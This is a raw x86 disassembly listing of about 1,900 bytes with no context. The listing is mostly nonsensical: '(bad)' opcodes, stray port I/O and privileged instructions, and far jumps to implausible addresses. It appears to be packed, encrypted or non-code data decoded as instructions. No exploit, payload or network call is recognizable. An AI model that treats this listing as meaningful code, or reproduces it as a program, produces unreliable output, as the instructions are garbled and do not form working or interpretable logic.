  48bbe8:	and    BYTE PTR [ecx],al
  48bbea:	(bad)  
  48bbeb:	je     0x48bc58
  48bbed:	push   cs
  48bbee:	or     bl,BYTE PTR [edx+0x11]
  48bbf1:	add    ecx,eax
  48bbf3:	add    al,0xd2
  48bbf5:	mov    ch,0x89
  48bbf7:	push   0xffffff8a
  48bbf9:	pop    esp
  48bbfa:	mov    ebp,edi
  48bbfc:	jp     0x48bbc4
  48bbfe:	mov    edi,0x7cfb2b77
  48bc03:	aas    
  48bc04:	inc    edi
  48bc05:	test   eax,0x12b74bf
  48bc0a:	jl     0x48bc24
  48bc0c:	arpl   WORD PTR ds:0x33a1cc04,bx
  48bc12:	(bad)  
  48bc13:	lea    ecx,[ecx+eax*2]
  48bc16:	mov    BYTE PTR [eax-0x2e],0xa7
  48bc1a:	sub    bl,0x36
  48bc1d:	pop    esi
  48bc1e:	mov    DWORD PTR [eax+eax*2+0xeb47b47],ecx
  48bc25:	dec    esi
  48bc26:	ret    0x5da1
  48bc29:	inc    edi
  48bc2a:	sbb    DWORD PTR [edi],0xffffffd9
  48bc2d:	out    dx,eax
  48bc2e:	bound  eax,QWORD PTR [edx]
  48bc30:	xchg   BYTE PTR [esi],cl
  48bc32:	cmp    BYTE PTR [ebp-0x46],0x8
  48bc36:	mov    BYTE PTR [ebp-0x7b],0x82
  48bc3a:	inc    edx
  48bc3b:	push   ebx
  48bc3c:	arpl   WORD PTR [edi-0xc],ax
  48bc3f:	daa    
  48bc40:	add    ebp,esp
  48bc42:	sub    al,bl
  48bc44:	sbb    BYTE PTR es:[ebx+0x75],bl
  48bc48:	add    ecx,esp
  48bc4a:	xor    ebp,ebp
  48bc4c:	ins    BYTE PTR es:[edi],dx
  48bc4d:	xor    DWORD PTR [esi-0x2a5b2359],0x227c8b04
  48bc57:	and    ebx,DWORD PTR [ecx+0x7f7e0b90]
  48bc5d:	aaa    
  48bc5e:	dec    edi
  48bc5f:	and    edx,eax
  48bc61:	mov    dl,0x3f
  48bc63:	xchg   edx,eax
  48bc64:	adc    eax,0xca75474b
  48bc69:	mov    cl,BYTE PTR [esi]
  48bc6b:	xchg   edi,eax
  48bc6c:	push   esp
  48bc6d:	sbb    dl,BYTE PTR [esi]
  48bc6f:	(bad)  
  48bc70:	idiv   BYTE PTR [esp+edi*1]
  48bc73:	mov    al,BYTE PTR [ebp+0x43c451ba]
  48bc79:	cmp    ebp,DWORD PTR [eax]
  48bc7b:	pop    ss
  48bc7c:	cmp    DWORD PTR [ebx+0xe],0x11
  48bc80:	xchg   edi,eax
  48bc81:	icebp  
  48bc82:	rcr    BYTE PTR [ecx-0x18],0x2e
  48bc86:	inc    edx
  48bc87:	(bad)  
  48bc89:	popf   
  48bc8a:	jne    0x48bc16
  48bc8c:	sub    BYTE PTR [eax+0x5bac116a],0x57
  48bc93:	inc    esi
  48bc94:	add    BYTE PTR [ecx],bh
  48bc96:	xchg   edx,eax
  48bc97:	cmp    al,0x74
  48bc99:	inc    eax
  48bc9a:	sbb    dh,BYTE PTR [ecx]
  48bc9c:	push   ebx
  48bc9d:	xlat   BYTE PTR ds:[ebx]
  48bc9e:	xchg   DWORD PTR [ecx-0x2cfe37e1],eax
  48bca4:	add    esi,edi
  48bca6:	dec    eax
  48bca7:	test   eax,0xd432c83e
  48bcac:	sbb    ebx,DWORD PTR [esi-0x267476c8]
  48bcb2:	mov    eax,0x5e8925a1
  48bcb7:	jo     0x48bc6a
  48bcb9:	fcom   DWORD PTR [eax-0x40]
  48bcbc:	xchg   edi,eax
  48bcbd:	inc    esp
  48bcbe:	in     al,dx
  48bcbf:	inc    ebx
  48bcc0:	inc    esp
  48bcc1:	and    ecx,DWORD PTR [ebx-0x7b9f3f31]
  48bcc7:	fiadd  DWORD PTR [ebp+0x7c]
  48bcca:	xor    bh,BYTE PTR [esi]
  48bccc:	ret    0xd8a6
  48bccf:	cmp    eax,DWORD PTR [eax+0x3c]
  48bcd2:	test   eax,0xc001fc37
  48bcd7:	mov    al,ds:0xf1b11b9a
  48bcdc:	jb     0x48bd0e
  48bcde:	out    dx,eax
  48bcdf:	xor    al,0x46
  48bce1:	inc    esp
  48bce2:	repz and ah,BYTE PTR [ebp+0x12c7448c]
  48bce9:	les    ecx,FWORD PTR [ecx]
  48bceb:	inc    eax
  48bcec:	dec    ebx
  48bced:	inc    eax
  48bcee:	xor    al,0xeb
  48bcf0:	mov    esp,0x8fb7118d
  48bcf5:	and    cl,BYTE PTR [ebx]
  48bcf7:	mov    eax,ds:0xefa75840
  48bcfc:	inc    eax
  48bcfd:	jb     0x48bd4d
  48bcff:	mov    eax,0x1727f9c9
  48bd04:	mov    ah,0x3b
  48bd06:	xor    BYTE PTR [ebx-0x11],bl
  48bd09:	inc    esp
  48bd0a:	push   ebx
  48bd0b:	mov    ecx,0xc13c7045
  48bd10:	cs add eax,esi
  48bd13:	ret    0x1e91
  48bd16:	push   ecx
  48bd17:	cli    
  48bd18:	add    BYTE PTR [eax+0x12379f31],cl
  48bd1e:	push   es
  48bd1f:	jge    0x48bcf3
  48bd21:	out    dx,eax
  48bd22:	or     dh,BYTE PTR ds:0x35e149b9
  48bd28:	dec    esi
  48bd29:	cwde   
  48bd2a:	ret    0x1002
  48bd2d:	stc    
  48bd2e:	sbb    ebx,DWORD PTR [edx+0xb75012d]
  48bd34:	xchg   esp,edi
  48bd36:	cdq    
  48bd37:	lods   al,BYTE PTR gs:[esi]
  48bd39:	nop
  48bd3a:	push   ebp
  48bd3b:	add    dh,BYTE PTR [ebp+0x1a]
  48bd3e:	pusha  
  48bd3f:	cmc    
  48bd40:	add    al,0x21
  48bd42:	xor    BYTE PTR [esi+0x2e04f487],al
  48bd48:	push   esp
  48bd49:	rcl    DWORD PTR [esi-0xfd6cd42],1
  48bd4f:	ds retf 0x4f38
  48bd53:	and    al,0x24
  48bd55:	mov    ebp,0x740226c3
  48bd5a:	cmp    BYTE PTR [ebx-0x140fd5],dh
  48bd60:	pop    ss
  48bd61:	adc    ecx,DWORD PTR [ebx*2+0xef477df]
  48bd68:	push   ecx
  48bd69:	and    edx,DWORD PTR [eax-0xe]
  48bd6c:	fld    TBYTE PTR [edi-0xb87d529]
  48bd72:	mov    ecx,0x25c681f4
  48bd77:	xchg   DWORD PTR [ebx+0x10],esp
  48bd7a:	mov    DWORD PTR [edi],ebx
  48bd7c:	jmp    0xffe8:0x21e0131e
  48bd83:	mov    bl,0x1
  48bd85:	cmp    ebp,DWORD PTR [edx]
  48bd87:	pop    ss
  48bd88:	adc    esi,DWORD PTR [eax+0xd]
  48bd8b:	data16 daa 
  48bd8d:	gs push ss
  48bd8f:	add    esi,DWORD PTR [eax+0x66]
  48bd92:	add    ecx,ebx
  48bd94:	cmp    ebp,eax
  48bd96:	out    dx,eax
  48bd97:	and    DWORD PTR [ebx],edx
  48bd99:	sub    ah,BYTE PTR [ecx]
  48bd9b:	dec    esp
  48bd9c:	adc    al,bl
  48bd9e:	mov    DWORD PTR [ebp+0x3e],esi
  48bda1:	retf   
  48bda2:	ficomp DWORD PTR ds:0xc087882c
  48bda8:	fnstcw WORD PTR [eax+ebp*8-0x3f7a9bc0]
  48bdaf:	js     0x48be05
  48bdb1:	int3   
  48bdb2:	js     0x48bd41
  48bdb4:	add    dl,BYTE PTR [eax+0x7757ca1b]
  48bdba:	sbb    BYTE PTR [ecx],0x92
  48bdbd:	mov    ah,0x76
  48bdbf:	mov    BYTE PTR [edx+0x13],bl
  48bdc2:	cmp    al,cl
  48bdc4:	dec    edx
  48bdc5:	pop    ds
  48bdc6:	push   esi
  48bdc7:	sbb    eax,0x6c784246
  48bdcc:	fbstp  TBYTE PTR [ecx+0x323a1e01]
  48bdd2:	mov    ah,0x99
  48bdd4:	and    DWORD PTR [esi+0xf],edi
  48bdd7:	add    DWORD PTR [esi],0x1b07fb82
  48bddd:	pop    esp
  48bdde:	(bad)  
  48bddf:	mov    cl,0x84
  48bde1:	addr16 or al,0x67
  48bde4:	push   ecx
  48bde5:	cmp    eax,0x669c29be
  48bdea:	push   es
  48bdeb:	adc    eax,0x480af028
  48bdf0:	or     al,0x80
  48bdf2:	xchg   esp,eax
  48bdf3:	inc    esi
  48bdf4:	jo     0x48bdbd
  48bdf6:	addr16 (bad) 
  48bdf8:	daa    
  48bdf9:	test   BYTE PTR [edi],dh
  48bdfb:	inc    esp
  48bdfc:	into   
  48bdfd:	aas    
  48bdfe:	pop    ecx
  48bdff:	scas   eax,DWORD PTR es:[edi]
  48be00:	push   eax
  48be01:	loop   0x48bddb
  48be03:	loop   0x48be34
  48be05:	inc    BYTE PTR [eax]
  48be07:	cmp    edi,DWORD PTR cs:[ebx-0x4d31eda8]
  48be0e:	jo     0x48be20
  48be10:	cs mov bh,0xad
  48be13:	aaa    
  48be14:	aad    0x66
  48be16:	xor    al,0x8b
  48be18:	adc    DWORD PTR [edx+eax*1+0x59],0xc
  48be1d:	int3   
  48be1e:	xor    al,0x6e
  48be20:	(bad)  
  48be21:	out    dx,eax
  48be22:	and    BYTE PTR [ebp+0x3c288d21],cl
  48be28:	inc    ecx
  48be29:	sbb    DWORD PTR [edx],ebx
  48be2b:	sbb    al,0xd
  48be2d:	or     eax,0x2f670829
  48be32:	ret    
  48be33:	sbb    bl,BYTE PTR [edx]
  48be35:	add    ecx,DWORD PTR [ebx]
  48be37:	(bad)  
  48be38:	and    ecx,DWORD PTR [ecx]
  48be3a:	add    cl,BYTE PTR [eax+0x41]
  48be3d:	jno    0x48be0b
  48be3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48be40:	fcmovnb st,st(0)
  48be42:	push   eax
  48be43:	add    eax,0x30ea69c0
  48be48:	dec    edx
  48be49:	ss push edx
  48be4b:	push   0xf48271b3
  48be50:	das    
  48be51:	dec    ebx
  48be52:	or     cl,BYTE PTR [esi]
  48be54:	dec    esi
  48be55:	nop
  48be56:	jecxz  0x48becb
  48be58:	ins    BYTE PTR es:[edi],dx
  48be59:	pop    eax
  48be5a:	pop    esp
  48be5b:	and    BYTE PTR [edi+0x13],dl
  48be5e:	in     eax,0x40
  48be60:	outs   dx,DWORD PTR ds:[esi]
  48be61:	ins    DWORD PTR es:[edi],dx
  48be62:	or     BYTE PTR [edi+edx*1+0x4],ch
  48be66:	xor    BYTE PTR cs:[ecx+0x6d],bl
  48be6a:	push   ds
  48be6b:	lock ins DWORD PTR es:[edi],dx
  48be6d:	iret   
  48be6e:	mov    al,ds:0xf4032c0a
  48be73:	loope  0x48be99
  48be75:	mov    al,ds:0x926b020e
  48be7a:	jbe    0x48bead
  48be7c:	mov    BYTE PTR [ebp+0x2],al
  48be7f:	jae    0x48bee8
  48be81:	inc    edx
  48be82:	enter  0x385b,0x66
  48be86:	mov    ecx,DWORD PTR ds:0x9c1b1bfc
  48be8c:	test   edx,edi
  48be8e:	or     ebx,esp
  48be90:	push   eax
  48be91:	cli    
  48be92:	mov    bh,0x49
  48be94:	js     0x48be8e
  48be96:	in     eax,dx
  48be97:	mov    cl,0x2
  48be99:	lods   eax,DWORD PTR ds:[esi]
  48be9a:	pop    ebx
  48be9b:	imul   edx,DWORD PTR [esi],0xffffffa2
  48be9e:	pop    ss
  48be9f:	sbb    BYTE PTR [ebx+0x772f0a03],0x40
  48bea6:	inc    edx
  48bea7:	daa    
  48bea8:	retf   0xfe7d
  48beab:	jecxz  0x48becd
  48bead:	add    DWORD PTR [edi-0x60ce82df],0x482b8033
  48beb7:	out    0x3b,al
  48beb9:	xlat   BYTE PTR ds:[ebx]
  48beba:	sub    ecx,DWORD PTR [eax-0x50]
  48bebd:	add    al,0xe8
  48bebf:	pop    edi
  48bec0:	int3   
  48bec1:	cmp    eax,ebp
  48bec3:	adc    DWORD PTR [eax-0x3785bd69],edx
  48bec9:	pop    ecx
  48beca:	aas    
  48becb:	sbb    DWORD PTR [ecx+0x5c2d2078],ebp
  48bed1:	add    eax,DWORD PTR [ebx]
  48bed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48bed4:	loopne 0x48be5c
  48bed6:	pusha  
  48bed7:	dec    ebx
  48bed8:	sbb    eax,0x443b001e
  48bedd:	aaa    
  48bede:	or     cl,BYTE PTR [esi+0x16]
  48bee1:	pop    edi
  48bee2:	mov    bl,0x2
  48bee4:	cmp    al,0x28
  48bee6:	xor    ebx,ecx
  48bee8:	sti    
  48bee9:	xchg   DWORD PTR [eax+edx*2+0x63995604],esp
  48bef0:	ror    BYTE PTR [eax+0x17],0x0
  48bef4:	push   ecx
  48bef5:	jb     0x48be7d
  48bef7:	imul   esi,DWORD PTR [eax-0x9],0xffffff8e
  48befb:	pop    ecx
  48befc:	mov    eax,0x6201d449
  48bf01:	retf   0xfa55
  48bf04:	data16 add BYTE PTR [edi+0x42],cl
  48bf08:	push   0xffffffa4
  48bf0a:	cli    
  48bf0b:	xchg   ebp,eax
  48bf0c:	test   al,0x62
  48bf0e:	test   eax,0x610c802
  48bf13:	jge    0x48bf74
  48bf15:	in     al,dx
  48bf16:	push   esi
  48bf17:	pusha  
  48bf18:	add    al,BYTE PTR [ebp+0x2c]
  48bf1b:	and    BYTE PTR [edx+0x11],ch
  48bf1e:	and    eax,DWORD PTR [eax-0xa]
  48bf21:	inc    ebx
  48bf22:	add    edi,eax
  48bf24:	shr    ah,0xb
  48bf27:	and    BYTE PTR [edi+edx*1-0x80],dh
  48bf2b:	outs   dx,DWORD PTR ds:[esi]
  48bf2c:	icebp  
  48bf2d:	pop    esp
  48bf2e:	push   eax
  48bf2f:	or     ebp,DWORD PTR ds:0x170221ec
  48bf35:	mov    al,0xc1
  48bf37:	fisub  DWORD PTR [ecx]
  48bf39:	scas   eax,DWORD PTR es:[edi]
  48bf3a:	cwde   
  48bf3b:	xchg   BYTE PTR [eax-0xd],al
  48bf3e:	mov    edx,0x5ccb7
  48bf43:	cmp    al,0x9c
  48bf45:	mov    edx,0xe2fc15a
  48bf4a:	cdq    
  48bf4b:	nop
  48bf4c:	jbe    0x48bf97
  48bf4e:	push   0xfffffffc
  48bf50:	pop    ebx
  48bf51:	push   ebp
  48bf52:	sub    BYTE PTR [edx+eax*1],dl
  48bf55:	adc    eax,0xc7b9424c
  48bf5a:	out    dx,al
  48bf5b:	cmp    BYTE PTR [ecx],cl
  48bf5d:	punpckldq mm0,DWORD PTR [edx+0x67]
  48bf61:	pushf  
  48bf62:	sbb    esp,eax
  48bf64:	es adc ch,bl
  48bf67:	mov    ?,ebp
  48bf69:	rcl    esi,0x44
  48bf6c:	retf   0x2f3
  48bf6f:	je     0x48bf01
  48bf71:	push   ebp
  48bf72:	lea    eax,[edi+esi*2+0xaa840b1]
  48bf79:	popa   
  48bf7a:	pop    eax
  48bf7b:	clc    
  48bf7c:	push   edi
  48bf7d:	sbb    DWORD PTR [ecx-0x2f],ebx
  48bf80:	mov    al,BYTE PTR [eax+0x41]
  48bf83:	xor    al,0x1
  48bf85:	xchg   ecx,eax
  48bf86:	inc    edx
  48bf87:	inc    eax
  48bf88:	xor    ebp,DWORD PTR [edi]
  48bf8a:	xor    BYTE PTR ds:0x4d6242eb,0xc5
  48bf91:	and    DWORD PTR [edi+eiz*4-0x72],0xc
  48bf96:	dec    ebp
  48bf97:	sub    eax,0x2c1a8b43
  48bf9c:	mov    eax,0xa661a46c
  48bfa1:	add    al,0x10
  48bfa3:	xor    al,dh
  48bfa5:	jl     0x48bfea
  48bfa7:	adc    BYTE PTR [esi+0x5450281e],bh
  48bfad:	and    BYTE PTR [ebp+0x376897a0],0x42
  48bfb4:	or     ch,al
  48bfb6:	fnstenv [eax+0x5a4475b]
  48bfbc:	cmc    
  48bfbd:	shl    BYTE PTR [edx-0x7f],0xe2
  48bfc1:	hlt    
  48bfc2:	and    ch,BYTE PTR [edi+edi*2+0x31]
  48bfc6:	cmp    BYTE PTR [ebx],bl
  48bfc8:	rol    BYTE PTR [edx+0x3a],cl
  48bfcb:	ret    0x4074
  48bfce:	xor    eax,0xcce92016
  48bfd3:	cmc    
  48bfd4:	shl    eax,0xd
  48bfd7:	lea    esp,[edi+eax*2-0x1]
  48bfdb:	lahf   
  48bfdc:	mov    bl,dl
  48bfde:	mov    dh,0x57
  48bfe0:	dec    eax
  48bfe1:	ret    0x8a2
  48bfe4:	ret    
  48bfe5:	mov    ds:0xce00685c,eax
  48bfea:	mov    ah,0xb7
  48bfec:	gs inc ebx
  48bfee:	cmp    bl,dh
  48bff0:	add    esp,0x644491e4
  48bff6:	pop    ecx
  48bff7:	aaa    
  48bff8:	lock daa 
  48bffa:	fnstenv [edi-0x73e3024f]
  48c000:	ror    DWORD PTR [ecx-0x41],1
  48c003:	add    DWORD PTR ds:0x1b0789fa,0x3c2c25fb
  48c00d:	jmp    0xeb1a:0x32aadb03
  48c014:	jl     0x48c052
  48c016:	inc    eax
  48c017:	mov    dh,0xf4
  48c019:	sub    ecx,DWORD PTR [edx]
  48c01b:	add    ebx,DWORD PTR [eax+0x31a35b80]
  48c021:	ins    BYTE PTR es:[edi],dx
  48c022:	xchg   ebp,eax
  48c023:	retf   
  48c024:	mov    ah,0x40
  48c026:	popa   
  48c027:	lahf   
  48c028:	jge    0x48c090
  48c02a:	aaa    
  48c02b:	xor    BYTE PTR [eax+0x41721879],cl
  48c031:	push   ebx
  48c032:	stos   DWORD PTR es:[edi],eax
  48c033:	add    DWORD PTR [eax+edx*4-0x3975bf73],edi
  48c03a:	add    bh,BYTE PTR [edx-0x2b1ff755]
  48c040:	pop    edx
  48c041:	and    al,0xff
  48c043:	pop    es
  48c044:	or     eax,0x724c9c00
  48c049:	repnz and al,0x40
  48c04c:	inc    eax
  48c04d:	add    DWORD PTR [ebx],esp
  48c04f:	or     al,0xe9
  48c051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c052:	fwait
  48c053:	pop    ss
  48c054:	cmp    eax,DWORD PTR [ebx-0x23]
  48c057:	dec    ebp
  48c058:	shr    DWORD PTR [esi-0x4febf4ec],0xf
  48c05f:	sub    BYTE PTR [edi-0x66],0x90
  48c063:	(bad)  
  48c064:	and    edi,ebp
  48c066:	pop    edi
  48c067:	mov    dh,0xee
  48c069:	stc    
  48c06a:	addr16 cld 
  48c06c:	std    
  48c06d:	test   DWORD PTR [edx+eiz*4],ecx
  48c070:	test   DWORD PTR [edi],esp
  48c072:	mov    al,ds:0x7e890667
  48c077:	sbb    eax,0x45c1f643
  48c07c:	mov    dh,0x12
  48c07e:	push   ebp
  48c07f:	sbb    DWORD PTR [ebx],ebp
  48c081:	pop    esi
  48c082:	xor    DWORD PTR [ecx+ebx*2+0x3b],esp
  48c086:	adc    edx,eax
  48c088:	jae    0x48c0a4
  48c08a:	cmp    al,0x99
  48c08c:	pop    ss
  48c08d:	pop    ss
  48c08e:	pop    eax
  48c08f:	sar    BYTE PTR [ebp+0x7c958d2d],0x11
  48c096:	je     0x48c0e3
  48c098:	out    dx,eax
  48c099:	int3   
  48c09a:	sbb    BYTE PTR [ebx],0xaa
  48c09d:	push   ebp
  48c09e:	sar    BYTE PTR [ebx+esi*1],0x42
  48c0a2:	or     BYTE PTR [edx-0x20fd51ac],cl
  48c0a8:	or     ebp,0x68971022
  48c0ae:	test   DWORD PTR [esp+esi*8+0x7a3fd8ac],eax
  48c0b5:	dec    ecx
  48c0b6:	inc    edi
  48c0b7:	or     al,0x79
  48c0b9:	arpl   bp,ax
  48c0bb:	xor    BYTE PTR ds:0xea827196,bh
  48c0c1:	push   es
  48c0c2:	inc    ecx
  48c0c3:	mov    BYTE PTR [edx],ah
  48c0c5:	pop    ds
  48c0c6:	sbb    dl,BYTE PTR [eax]
  48c0c8:	(bad)  
  48c0c9:	dec    edx
  48c0ca:	cmp    al,0x43
  48c0cc:	inc    esp
  48c0cd:	sahf   
  48c0ce:	add    BYTE PTR [esi],cl
  48c0d0:	mov    dl,0xea
  48c0d2:	into   
  48c0d3:	pop    ebx
  48c0d4:	inc    ecx
  48c0d5:	adc    ebx,DWORD PTR [edi]
  48c0d7:	lahf   
  48c0d8:	fsub   DWORD PTR [edi+0x17]
  48c0db:	ror    BYTE PTR [ebp+0x58e792c8],cl
  48c0e1:	int    0x5c
  48c0e3:	cwde   
  48c0e4:	or     edx,DWORD PTR [edi+ebp*1-0x5d]
  48c0e8:	mov    ch,ah
  48c0ea:	inc    ecx
  48c0eb:	pop    eax
  48c0ec:	push   esi
  48c0ed:	rol    BYTE PTR [ebp+0x6b],1
  48c0f0:	in     al,0x77
  48c0f2:	sub    eax,edi
  48c0f4:	jecxz  0x48c11c
  48c0f6:	push   edi
  48c0f7:	cmp    BYTE PTR [ebp+0x32],ah
  48c0fa:	xor    al,0x5
  48c0fc:	mov    cl,0xf0
  48c0fe:	or     DWORD PTR [ecx+0x7b804c1a],0x41
  48c105:	or     BYTE PTR es:[ebp+edi*8+0x7eba585],bl
  48c10d:	dec    ecx
  48c10e:	enter  0xd85e,0x6c
  48c112:	or     al,0x37
  48c114:	scas   eax,DWORD PTR es:[edi]
  48c115:	or     eax,0x6fba0971
  48c11a:	adc    BYTE PTR [ebp+0x292c029e],dh
  48c120:	test   ch,ch
  48c122:	xlat   BYTE PTR ds:[ebx]
  48c123:	push   0x979f7013
  48c128:	cs out 0x2b,eax
  48c12b:	lahf   
  48c12c:	pop    esp
  48c12d:	dec    ecx
  48c12e:	push   0xffffffe4
  48c130:	inc    ebx
  48c131:	inc    esp
  48c132:	call   0x8a55057a
  48c137:	add    al,0x6c
  48c139:	add    edx,DWORD PTR [ecx]
  48c13b:	clc    
  48c13c:	pop    ebx
  48c13d:	daa    
  48c13e:	lea    edx,[ecx+esi*8+0x50092c9b]
  48c145:	adc    ecx,ebx
  48c147:	in     al,dx
  48c148:	test   eax,0xd82b9f48
  48c14d:	das    
  48c14e:	dec    eax
  48c14f:	and    BYTE PTR [edi+0x48442e41],dl
  48c155:	inc    esp
  48c156:	inc    esp
  48c157:	inc    edx
  48c158:	jns    0x48c122
  48c15a:	dec    eax
  48c15b:	sub    ebx,eax
  48c15d:	cmp    al,0xa1
  48c15f:	mov    ebp,0x773bcf2a
  48c164:	mov    dh,0xe
  48c166:	lock or DWORD PTR [edx+0x4c],ebp
  48c16a:	arpl   WORD PTR [edx],sp
  48c16c:	mov    eax,ds:0xc822a433
  48c171:	inc    ebp
  48c172:	imul   eax,DWORD PTR [edi-0x5c7ead0],0xf633fe1f
  48c17c:	test   dl,0x10
  48c17f:	je     0x48c19a
  48c181:	push   ecx
  48c182:	addr16 mov ah,0xc
  48c185:	adc    edx,DWORD PTR [edi]
  48c187:	mov    eax,0x1b10853
  48c18c:	xchg   edx,eax
  48c18d:	ror    edi,1
  48c18f:	add    BYTE PTR [eax],dh
  48c191:	adc    edx,DWORD PTR [esi]
  48c193:	xor    DWORD PTR [eax],esi
  48c195:	mov    esp,0x2087a810
  48c19a:	cmp    esi,DWORD PTR [bp+di]
  48c19d:	leave  
  48c19e:	test   al,0xf
  48c1a0:	add    al,0x8a
  48c1a2:	or     al,0x3c
  48c1a4:	sub    al,0x94
  48c1a6:	xor    BYTE PTR [edx+0x0],ch
  48c1a9:	ret    
  48c1aa:	cwde   
  48c1ab:	dec    ecx
  48c1ac:	push   cs
  48c1ad:	add    eax,0xcf64c604
  48c1b2:	test   eax,0x8700d16c
  48c1b7:	push   edi
  48c1b8:	mov    ?,esi
  48c1ba:	jmp    0x407a0768
  48c1bf:	fiadd  WORD PTR [ebx-0x1101ba0a]
  48c1c5:	push   esi
  48c1c6:	sub    DWORD PTR ds:0x2a06d684,0x23
  48c1cd:	dec    eax
  48c1ce:	dec    ecx
  48c1cf:	dec    esi
  48c1d0:	mov    eax,DWORD PTR [ecx+0x18ca1f3d]
  48c1d6:	shl    BYTE PTR [edi-0x7eb5cc0b],1
  48c1dc:	inc    eax
  48c1dd:	cmp    DWORD PTR [ecx+0x75],ecx
  48c1e0:	inc    esi
  48c1e1:	clc    
  48c1e2:	repnz add ah,bh
  48c1e5:	xor    ah,ah
  48c1e7:	pop    ecx
  48c1e8:	sub    esi,esp
  48c1ea:	mov    eax,0x65b7a59
  48c1ef:	mov    dl,BYTE PTR [edx]
  48c1f1:	and    esp,esi
  48c1f3:	pop    edx
  48c1f4:	call   DWORD PTR [ecx]
  48c1f6:	adc    BYTE PTR [edi+0x43fa595e],0x30
  48c1fd:	xchg   ebp,eax
  48c1fe:	mov    bl,0x5
  48c200:	or     al,0x29
  48c202:	shl    al,1
  48c204:	popf   
  48c205:	push   ss
  48c206:	jo     0x48c1b1
  48c208:	adc    esi,DWORD PTR [eax-0x3dea22bb]
  48c20e:	dec    eax
  48c20f:	pop    ebp
  48c210:	and    edi,0xffffffa8
  48c213:	dec    ecx
  48c214:	test   DWORD PTR [eax-0x7e4b172a],eax
  48c21a:	lods   al,BYTE PTR ds:[esi]
  48c21b:	or     DWORD PTR [edi-0x39],0xffffffd4
  48c21f:	ror    BYTE PTR [eax+esi*8],cl
  48c222:	aam    0xae
  48c224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c225:	mov    esp,gs
  48c227:	fimul  WORD PTR [eax]
  48c229:	fstp   DWORD PTR [esi]
  48c22b:	sub    eax,0xc21580c3
  48c230:	ja     0x48c209
  48c232:	test   bl,0x70
  48c235:	(bad)  
  48c236:	ins    DWORD PTR es:[edi],dx
  48c237:	push   esi
  48c238:	aas    
  48c239:	ins    BYTE PTR es:[edi],dx
  48c23a:	or     eax,0xf8f492f4
  48c23f:	push   ebp
  48c240:	mov    al,BYTE PTR [ebx+0x8]
  48c243:	jmp    0xc4ab18c2
  48c248:	pop    edx
  48c249:	xor    al,0x74
  48c24b:	inc    esp
  48c24c:	cwde   
  48c24d:	(bad)  
  48c24e:	jge    0x48c22e
  48c250:	inc    edi
  48c251:	loope  0x48c262
  48c253:	xor    bh,BYTE PTR [ebp+0x37]
  48c256:	(bad)  
  48c257:	(bad)  
  48c258:	jmp    0x48c288
  48c25a:	gs or  eax,0xc1df124
  48c260:	adc    al,bh
  48c262:	out    dx,al
  48c263:	repz into 
  48c265:	adc    ecx,DWORD PTR [ebp+0x310ac2c]
  48c26b:	pop    esp
  48c26c:	sbb    BYTE PTR [ebx],0x74
  48c26f:	and    al,0xc
  48c271:	aaa    
  48c272:	or     edi,eax
  48c274:	jl     0x48c279
  48c276:	ficomp WORD PTR [di]
  48c279:	push   0x14
  48c27b:	in     al,dx
  48c27c:	nop
  48c27d:	call   0xffaf51f7
  48c282:	dec    esi
  48c283:	lock cmp eax,0xe9420b5d
  48c289:	sbb    BYTE PTR [ecx],ch
  48c28b:	mov    edi,DWORD PTR [ecx-0x57]
  48c28e:	pop    esp
  48c28f:	sbb    BYTE PTR [ebp+ebp*1+0x71],0xd0
  48c294:	ds scas al,BYTE PTR es:[edi]
  48c296:	and    bh,BYTE PTR [eax+0x1b]
  48c299:	or     DWORD PTR [ebx-0x6ade9e15],ebx
  48c29f:	pop    ebp
  48c2a0:	aam    0x21
  48c2a2:	aam    0xa8
  48c2a4:	or     al,0x2a
  48c2a6:	or     ebp,DWORD PTR [esi-0x6fb8f4f5]
  48c2ac:	add    al,0xb0
  48c2ae:	push   cs
  48c2af:	sbb    ah,BYTE PTR [esi]
  48c2b1:	call   0xec96:0x15960476
  48c2b8:	push   es
  48c2b9:	xchg   ecx,eax
  48c2ba:	adc    al,0xbe
  48c2bc:	pop    ds
  48c2bd:	or     BYTE PTR [ebp-0x14],dl
  48c2c0:	aaa    
  48c2c1:	in     al,dx
  48c2c2:	pop    edx
  48c2c3:	adc    ecx,DWORD PTR [ecx*4-0x179f204b]
  48c2ca:	fst    DWORD PTR [ebx+0x3]
  48c2cd:	add    al,0x2e
  48c2cf:	je     0x48c334
  48c2d1:	enter  0x9904,0x9d
  48c2d5:	push   0x36
  48c2d7:	inc    ebx
  48c2d8:	or     al,0xc7
  48c2da:	dec    eax
  48c2db:	(bad)
  48c2df:	pushf  
  48c2e0:	call   0xb8c7:0xdf09e89
  48c2e7:	xor    DWORD PTR [eax],esi
  48c2e9:	sbb    esp,edx
  48c2eb:	dec    ebx
  48c2ec:	inc    ebx
  48c2ed:	pop    ebx
  48c2ee:	push   cs
  48c2ef:	push   ebx
  48c2f0:	dec    esp
  48c2f1:	dec    edx
  48c2f2:	out    dx,eax
  48c2f3:	jae    0x48c330
  48c2f5:	inc    ebp
  48c2f6:	adc    bl,bh
  48c2f8:	dec    eax
  48c2f9:	rol    BYTE PTR [edx],0x1e
  48c2fc:	(bad)  [ebp+0xc]
  48c2ff:	sbb    al,0xc
  48c301:	shl    dh,cl
  48c303:	cmp    BYTE PTR [edx],0xc4
  48c306:	rdmsr  
  48c308:	lods   eax,DWORD PTR ds:[esi]
  48c309:	ficom  DWORD PTR [eax]
  48c30b:	ds jb  0x48c321
  48c30e:	sbb    eax,0x9a1230d8
  48c313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c314:	dec    eax
  48c315:	mov    bh,0x3a
  48c317:	outs   dx,BYTE PTR ds:[esi]
  48c318:	(bad)  
  48c319:	jmp    0x26c6:0x30744403
  48c320:	add    BYTE PTR [edi+0x7],cl
  48c323:	jl     0x48c2d9
  48c325:	xor    BYTE PTR [eax+0x78414167],ch
  48c32b:	sub    BYTE PTR [edi-0x18],0x11
  48c32f:	aaa    
  48c330:	aaa    
  48c331:	sbb    bh,BYTE PTR [edi+0x66440093]
  48c337:	sub    eax,0x5f508a0e
  48c33c:	add    cl,BYTE PTR [esi]
  48c33e:	call   0xc850:0x3cd85500
  48c345:	jp     0x48c370
  48c347:	(bad)  
  48c348:	push   ebp
  48c349:	cmp    DWORD PTR [esi],ebp
  48c34b:	jl     0x48c372
  48c34d:	ss in  al,dx
  48c34f:	push   edi
